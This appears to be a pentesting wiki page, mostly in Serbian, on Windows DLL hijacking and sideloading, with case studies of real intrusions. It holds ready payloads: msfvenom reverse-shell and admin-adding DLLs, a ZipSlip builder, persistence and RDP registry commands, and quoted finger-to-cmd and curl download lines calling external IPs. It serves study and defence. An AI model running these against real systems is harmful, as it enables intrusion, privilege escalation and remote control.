# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Osnovne informacije

DLL Hijacking podrazumeva manipulaciju pouzdanom aplikacijom da učita zlonamerni DLL. Ovaj termin obuhvata nekoliko taktika kao što su **DLL Spoofing, Injection, and Side-Loading**. Najčešće se koristi za izvršavanje koda, postizanje persistence, i, ređe, eskalaciju privilegija. Iako je ovde fokus na eskalaciji, metod hijackinga ostaje isti za različite ciljeve.

### Uobičajene tehnike

Koriste se različite metode za DLL hijacking, čija je efikasnost zavisna od strategije učitavanja DLL-ova u aplikaciji:

1. **DLL Replacement**: Zamena legitimnog DLL-a zlonamernim, opciono koristeći DLL Proxying da se sačuva funkcionalnost originalnog DLL-a.
2. **DLL Search Order Hijacking**: Postavljanje zlonamernog DLL-a u putanju pre legitimnog, iskorištavajući obrazac pretrage aplikacije.
3. **Phantom DLL Hijacking**: Kreiranje zlonamernog DLL-a za aplikaciju koja misli da traži nepostojeći potreban DLL.
4. **DLL Redirection**: Izmena parametara pretrage kao što su %PATH% ili .exe.manifest / .exe.local fajlovi da bi se aplikacija usmerila na zlonamerni DLL.
5. **WinSxS DLL Replacement**: Zamena legitimnog DLL-a zlonamernim u WinSxS direktorijumu, metoda koja je često povezana sa DLL side-loading-om.
6. **Relative Path DLL Hijacking**: Postavljanje zlonamernog DLL-a u direktorijum pod kontrolom korisnika uz kopiranu aplikaciju, što podseća na Binary Proxy Execution tehnike.

> [!TIP]
> Za korak-po-korak lanac koji slaže HTML staging, AES-CTR konfiguracije i .NET implantate preko DLL sideloadinga, pogledajte workflow ispod.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Pronalaženje nedostajućih DLL-ova

Najčešći način da se pronađu nedostajući DLL-ovi u sistemu je pokretanje [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) iz sysinternals, pritom **podešavajući** **sledeća 2 filtera**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

i jednostavno prikažite **File System Activity**:

![](<../../../images/image (153).png>)

Ako tražite **nedostajuće DLL-ove uopšteno** ostavite ovo da radi nekoliko **sekundi**.\
Ako tražite **nedostajući DLL unutar određenog izvršnog fajla**, trebalo bi da postavite **dodatni filter kao što je "Process Name" "contains" `<exec name>`, pokrenete ga i zaustavite snimanje događaja**.

## Eksploatisanje nedostajućih DLL-ova

Da bismo eskalirali privilegije, najbolja šansa je da možemo upisati DLL koji će proces sa višim privilegijama pokušati da učita u neku od lokacija gde će se tražiti. Dakle, moći ćemo da upišemo DLL u direktorijum gde se DLL traži pre direktorijuma u kojem se nalazi originalni DLL (neobičan slučaj), ili ćemo moći da upišemo u neki direktorijum gde će se DLL tražiti a originalni DLL ne postoji ni u jednom direktorijumu.

### Dll Search Order

U [**Microsoft dokumentaciji**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) možete pronaći kako se DLL-ovi učitavaju tačno.

Windows aplikacije traže DLL-ove prateći skup predefinisanih putanja za pretragu, u određenom redosledu. Problem DLL hijackinga nastaje kada je zlonamerni DLL strateški postavljen u jedan od ovih direktorijuma tako da se učita pre autentičnog DLL-a. Rešenje je osigurati da aplikacija koristi apsolutne putanje kada referencira potrebne DLL-ove.

Ispod je prikazan **redosled pretrage DLL-ova na 32-bitnim** sistemima:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Ovo je **podrazumevani** redosled pretrage sa omogućenim **SafeDllSearchMode**. Kada je isključen, tekući direktorijum prelazi na drugo mesto. Da biste onemogućili ovu opciju, kreirajte vrednost registra **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i postavite je na 0 (podrazumevano je omogućeno).

Ako se funkcija [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) pozove sa **LOAD_WITH_ALTERED_SEARCH_PATH**, pretraga počinje u direktorijumu izvršnog modula koji LoadLibraryEx učitava.

Na kraju, imajte na umu da se DLL može učitati navodeći apsolutnu putanju umesto samo imena. U tom slučaju taj DLL će biti tražen samo u toj putanji (ako DLL ima zavisnosti, one će se tražiti kako bi bile učitane po imenu).

Postoje i drugi načini da se menja redosled pretrage, ali ih ovde neću objašnjavati.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use ProcMon filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostavite arhivu u nadgledani inbox/share; kada zakazani task ponovo pokrene proces, on će učitati maliciozni DLL i izvršiti vaš kod kao service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Napredan način da deterministički utičete na DLL search path novokreiranog procesa je podešavanje polja DllPath u RTL_USER_PROCESS_PARAMETERS prilikom kreiranja procesa pomoću ntdll-ovih native API-ja. Ako ovde navedete direktorijum koji kontroliše napadač, ciljni proces koji resolve-uje uvoženi DLL po imenu (bez apsolutne putanje i ne koristeći safe loading flags) može biti primoran da učita maliciozni DLL iz tog direktorijuma.

Ključna ideja
- Izgradite process parameters koristeći RtlCreateProcessParametersEx i navedite custom DllPath koji pokazuje na folder pod vašom kontrolom (npr. direktorijum gde se nalazi vaš dropper/unpacker).
- Kreirajte proces koristeći RtlCreateUserProcess. Kada ciljni binarni fajl resolve-uje DLL po imenu, loader će konsultovati ovaj isporučeni DllPath tokom rezolucije, omogućavajući pouzdan sideloading čak i kada maliciozni DLL nije kolociran sa ciljnim EXE-om.

Napomene/ograničenja
- Ovo utiče na child process koji se kreira; razlikuje se od SetDllDirectory, koji utiče samo na trenutni proces.
- Cilj mora import-ovati ili pozvati LoadLibrary za DLL po imenu (bez apsolutne putanje i ne koristeći LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i hardkodirane apsolutne putanje se ne mogu hijack-ovati. Forwarded exports i SxS mogu promeniti prioritet.

Minimal C primer (ntdll, wide strings, pojednostavljeno rukovanje greškama):

<details>
<summary>Potpuni C primer: forsiranje sideloading-a preko RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operativni primer upotrebe
- Postavite maliciozni xmllite.dll (koji eksportuje potrebne funkcije ili radi proxy ka pravom) u direktorijum DllPath.
- Pokrenite potpisani binarni fajl za koji je poznato da traži xmllite.dll po imenu koristeći gore navedenu tehniku. Loader rešava import putem dostavljenog DllPath i sideloads-uje vaš DLL.

Ova tehnika je primećena in-the-wild da pokreće višestepene sideloading lance: inicijalni launcher ispusti pomoćni DLL, koji potom pokreće Microsoft-signed, hijackable binarni fajl sa prilagođenim DllPath-om kako bi prisilio učitavanje napadačevog DLL-a iz staging direktorijuma.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Eskalacija privilegija

**Zahtevi**:

- Identifikujte proces koji radi ili će raditi pod **različitim privilegijama** (horizontalno ili lateralno kretanje), a koji **nema DLL**.
- Osigurajte da postoji **write access** za bilo koji **direktorijum** u kojem će se **DLL** **pretraživati**. Ova lokacija može biti direktorijum izvršnog fajla ili direktorijum unutar system path-a.

Da, uslovi su komplikovani za naći jer je **po defaultu prilično čudno naći privilegovani izvršni fajl koji nema DLL** i još je **čudnije imati write permissions na folder u system path-u** (po defaultu to nije moguće). Ali, u pogrešno konfigurisanom okruženju ovo je moguće.\
U slučaju da imate sreće i ispunjavate zahteve, možete pogledati [UACME](https://github.com/hfiref0x/UACME) projekat. Čak i ako je **glavni cilj projekta bypass UAC**, tamo možete naći **PoC** Dll hijaking-a za verziju Windows-a koju možete iskoristiti (verovatno samo promenom putanje foldera u kojem imate write permissions).

Imajte na umu da možete **proveriti svoja prava u direktorijumu** radeći:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **proverite dozvole svih direktorijuma unutar PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Takođe možete proveriti imports izvršnog fajla i exports dll-a pomoću:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatski alati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Drugi interesantni automatizovani alati za otkrivanje ove ranjivosti su **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Primer

Ako pronađete scenario koji se može iskoristiti, jedna od najvažnijih stvari za uspešnu eksploataciju biće da **kreirate dll koji eksportuje bar sve funkcije koje će izvršni fajl importovati iz njega**. Imajte u vidu da Dll Hijacking može biti koristan za [eskalaciju sa Medium Integrity level-a na High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ili sa[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Možete naći primer **how to create a valid dll** u ovoj dll hijacking studiji fokusiranoj na dll hijacking za izvršavanje: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\  
Štaviše, u **sledećem odeljku** možete naći neke **basic dll codes** koji bi mogli biti korisni kao **templates** ili za kreiranje **dll-a sa izvezenim nepotrebnim funkcijama**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

U suštini, **Dll proxy** je Dll sposoban da **izvrši vaš maliciozni kod kada se učita**, ali i da **izlaže** i **radi** kao što se očekuje tako što prosleđuje sve pozive pravoj biblioteci.

Pomoću alata [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) možete zapravo **indicate an executable and select the library** koju želite proxify-ovati i **generisati a proxified dll** ili **indicate the Dll** i **generisati a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Dobijte meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kreiraj korisnika (x86, nisam video x64 verziju):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Vaš sopstveni

Obratite pažnju da u nekoliko slučajeva Dll koji kompajlirate mora **export several functions** koje će biti učitane od strane victim process; ako te funkcije ne postoje, **binary won't be able to load them** i **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL primer sa kreiranjem korisnika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativna C DLL sa thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studija slučaja: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe i dalje pri pokretanju proverava predvidljivi, specifičan za jezik localization DLL, koji može biti hijacked za proizvoljno izvršavanje koda i postojanost.

Ključne činjenice
- Putanja provere (trenutne verzije): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Nasleđena putanja (starije verzije): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ako na OneCore putanji postoji writable DLL pod kontrolom napadača, ona se učitava i `DllMain(DLL_PROCESS_ATTACH)` se izvršava. Nisu potrebni exports.

Otkrivanje pomoću Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Pokrenite Narrator i posmatrajte pokušaj učitavanja gore navedene putanje.

Minimalni DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Studija slučaja: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Ovaj slučaj demonstrira **Phantom DLL Hijacking** u Lenovo-ovom TrackPoint Quick Menu (`TPQMAssistant.exe`), praćeno kao **CVE-2025-1729**.

### Detalji ranjivosti

- **Komponenta**: `TPQMAssistant.exe` koji se nalazi u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` se izvršava svakodnevno u 9:30 AM pod kontekstom prijavljenog korisnika.
- **Directory Permissions**: Upisivo za `CREATOR OWNER`, što omogućava lokalnim korisnicima da ostave proizvoljne fajlove.
- **DLL Search Behavior**: Pokušava prvo da učita `hostfxr.dll` iz svog radnog direktorijuma i beleži "NAME NOT FOUND" ako nedostaje, što ukazuje na prioritet pretrage lokalnog direktorijuma.

### Exploit Implementation

Napadač može postaviti zlonamerni `hostfxr.dll` stub u isti direktorijum, iskoristivši nedostajući DLL da postigne izvršenje koda u kontekstu korisnika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Tok napada

1. Kao standardni korisnik, postavite `hostfxr.dll` u `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Sačekajte da se planirani zadatak pokrene u 9:30 AM u kontekstu trenutnog korisnika.
3. Ako je administrator prijavljen kada se zadatak izvrši, zlonamerni DLL će se pokrenuti u administratorskoj sesiji na medium integrity.
4. Lančajte standardne UAC bypass techniques da biste eskalirali privilegije sa medium integrity na SYSTEM.

## Studija slučaja: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Akteri pretnje često kombinuju MSI-based droppere sa DLL side-loading da bi izvršili payloads pod pouzdanim, potpisanim procesom.

Chain overview
- Korisnik preuzme MSI. A CustomAction radi tiho tokom GUI instalacije (npr. LaunchApplication ili VBScript action), rekonstruišući sledeću fazu iz ugrađenih resursa.
- Dropper upisuje legitimni, potpisani EXE i zlonamerni DLL u isti direktorijum (primer para: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Kada se potpisani EXE pokrene, Windows DLL search order učitava wsc.dll iz radnog direktorijuma prvi, izvršavajući kôd napadača pod potpisanim roditeljem (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Tražite unose koji pokreću izvršne fajlove ili VBScript. Primer sumnjivog obrasca: LaunchApplication koji izvršava ugrađeni fajl u pozadini.
- U Orca (Microsoft Orca.exe), pregledajte CustomAction, InstallExecuteSequence i Binary tabele.
- Ugrađeni/podeljeni payloads u MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Tražite više malih fragmenata koji se konkateniraju i dekriptuju pomoću VBScript CustomAction. Uobičajeni tok:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktično sideloading sa wsc_proxy.exe
- Postavite ova dva fajla u isti folder:
- wsc_proxy.exe: legitimno potpisani host (Avast). Proces pokušava da učita wsc.dll po imenu iz svog direktorijuma.
- wsc.dll: attacker DLL. Ako nisu potrebni specifični exports, DllMain može biti dovoljan; u suprotnom, napravite proxy DLL i prosledite potrebne exports pravoj biblioteci dok pokrećete payload u DllMain.
- Napravite minimalni DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Za zahteve za export, koristite proxying framework (npr., DLLirant/Spartacus) da generišete forwarding DLL koji takođe izvršava vaš payload.

- Ova tehnika se oslanja na rezoluciju imena DLL-a od strane host binarnog fajla. Ako host koristi apsolutne putanje ili safe loading flag-ove (npr., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack može da zakaže.
- KnownDLLs, SxS, i forwarded exports mogu uticati na precedencu i moraju se uzeti u obzir pri izboru host binarnog fajla i skupa export-a.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point je opisao kako Ink Dragon raspoređuje ShadowPad koristeći **triadu od tri fajla** da se uklopi među legitimni softver dok drži core payload šifrovanim na disku:

1. **Signed host EXE** – proizvođači poput AMD, Realtek ili NVIDIA se zloupotrebljavaju (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Napadači preimenuju izvršni fajl da izgleda kao Windows binarni (na primer `conhost.exe`), ali Authenticode potpis ostaje validan.
2. **Malicious loader DLL** – ubačen pored EXE-a pod očekivanim imenom (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL je obično MFC binarni obfuskovan ScatterBrain framework-om; njegov jedini zadatak je da pronađe šifrovani blob, dešifruje ga i reflectively map-uje ShadowPad.
3. **Encrypted payload blob** – često se čuva kao `<name>.tmp` u istom direktorijumu. Nakon memory-mapping-a dešifrovanog payload-a, loader briše TMP fajl da uništi forenzičke dokaze.

Napomene o tradecraftu:

* Preimenovanje signed EXE-a (pri čuvanju originalnog `OriginalFileName` u PE header-u) dozvoljava da se prerušava u Windows binarni, ali zadržava vendor potpis, pa replicirajte Ink Dragon-ovu naviku da postavljate `conhost.exe`-slične binarne koje su ustvari AMD/NVIDIA utiliti.
* Pošto izvršni fajl ostaje trusted, većina allowlisting kontrola obično samo zahteva da se vaš malicious DLL nalazi pored njega. Fokusirajte se na prilagođavanje loader DLL-a; potpisani parent obično može ostati nepromenjen.
* ShadowPad-ov decryptor očekuje da TMP blob bude pored loader-a i upisiv kako bi mogao da ga zero-uje nakon mapovanja. Ostavite direktorijum upisiv dok se payload učitava; jednom u memoriji TMP fajl može bezbedno biti obrisan zbog OPSEC-a.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators kombinuju DLL sideloading sa LOLBAS tako da jedini custom artifact na disku bude malicious DLL pored trusted EXE-a:

- **Remote command loader (Finger):** Sakriven PowerShell pokreće `cmd.exe /c`, vadi komande sa Finger servera, i prosleđuje ih `cmd`-u:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` vadi TCP/79 tekst; `| cmd` izvršava odgovor servera, omogućavajući operatorima da rotiraju second stage server-side.

- **Built-in download/extract:** Preuzmite archive sa benignim ekstenzijom, raspakujte ga i postavite sideload target plus DLL pod nasumičan `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progres i prati redirect-e; `tar -xf` koristi ugrađeni Windows `tar`.

- **WMI/CIM launch:** Pokrenite EXE preko WMI tako da telemetrija pokaže CIM-created proces dok učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Radi sa binarnim fajlovima koji preferiraju lokalne DLL-ove (npr., `intelbq.exe`, `nearby_share.exe`); payload (npr., Remcos) se izvršava pod trusted imenom.

- **Hunting:** Alert-ujte na `forfiles` kada se `/p`, `/m`, i `/c` pojave zajedno; retko van admin skripti.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Recentna Lotus Blossom intruzija je zloupotrebila trusted update lanac da isporuči NSIS-packed dropper koji je postavio DLL sideload plus potpuno in-memory payload-e.

Tok tradecraft-a
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, drop-uje preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, maligni `log.dll`, i šifrovani blob `BluetoothService`, a zatim pokreće EXE.
- Host EXE importuje `log.dll` i zove `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga dešifruje custom LCG-based stream-om (konstante **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), prepisuje buffer plaintext shellcode-om, oslobadja temporare fajlove i skače na njega.
- Da bi izbegao IAT, loader rešava API-je hash-ovanjem export imena koristeći **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi protiv salted target hash-eva.

Glavni shellcode (Chrysalis)
- Dešifruje PE-like glavni modul ponavljanjem add/XOR/sub sa ključem `gQ2JR&9;` kroz pet prolaza, zatim dinamički load-uje `Kernel32.dll` → `GetProcAddress` da završi import rezoluciju.
- Rekonstruiše DLL name stringove u runtime-u pomoću po-karakternih bit-rotate/XOR transformacija, zatim load-uje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
